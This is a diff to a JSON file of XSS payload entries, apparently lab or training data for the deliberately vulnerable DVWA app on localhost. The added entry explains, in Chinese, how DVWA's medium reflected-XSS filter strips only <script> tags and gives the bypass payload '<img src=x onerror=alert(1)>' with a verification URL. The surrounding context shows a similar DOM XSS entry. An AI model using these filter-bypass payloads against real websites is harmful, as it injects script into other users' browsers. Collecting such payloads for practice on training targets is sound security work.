@@ -441,5 +441,13 @@
     "principle": "document.write sink breakout：用非 script 标签 img onerror 绕过只拦 <script 的过滤，客户端 DOM 直接执行",
     "source": "dvwa",
     "verify_url": "http://localhost:8081/vulnerabilities/xss_d/?default=<img src=x onerror=alert(1)>"
+  },
+  {
+    "id": "auto-20261030130656",
+    "context": "DVWA medium Reflected XSS。name 参数直接反射进 HTML。medium 过滤删除 <script> 标签（大小写不敏感），但未过滤其它标签/事件属性，用 <img src=x onerror=...> 即可执行。",
+    "reference_payload": "<img src=x onerror=alert(1)>",
+    "principle": "script 标签黑名单过滤绕过：改用 img onerror 事件处理器自动触发 JS",
+    "source": "dvwa",
+    "verify_url": "http://localhost:8081/vulnerabilities/xss_r/?name={payload}"
   }
 ]
